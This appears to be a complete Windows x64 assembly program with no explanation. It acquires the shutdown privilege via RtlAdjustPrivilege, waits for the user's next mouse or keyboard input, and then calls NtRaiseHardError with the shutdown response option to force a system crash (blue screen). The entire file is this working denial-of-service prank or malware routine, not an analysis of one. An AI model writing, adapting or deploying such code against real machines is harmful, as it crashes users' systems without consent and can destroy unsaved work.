extern RtlAdjustPrivilege
extern NtRaiseHardError
extern Sleep
extern GetLastInputInfo

section .bss
lii resq 1
last resd 1

section .code
main:
sub rsp, 8
mov rcx, 19
mov rdx, 1
mov r8, 0
lea r9, [last]
call RtlAdjustPrivilege
mov rcx, 10000
call Sleep
mov DWORD [lii], 8
lea rcx, [lii]
call GetLastInputInfo
mov edx, DWORD [lii + 4]
mov DWORD [last], edx
loop:
mov rcx, 100
call Sleep
lea rcx, [lii]
call GetLastInputInfo
test eax, eax
jz loop
mov eax, DWORD[lii + 4]
test eax, eax
jz loop
cmp eax, DWORD[last]
je loop
lea rax, [last]
push rax
push 6
sub rsp, 32
mov rcx, 0xc0000022
mov rdx, 0
mov r8, 0
mov r9, 0
call NtRaiseHardError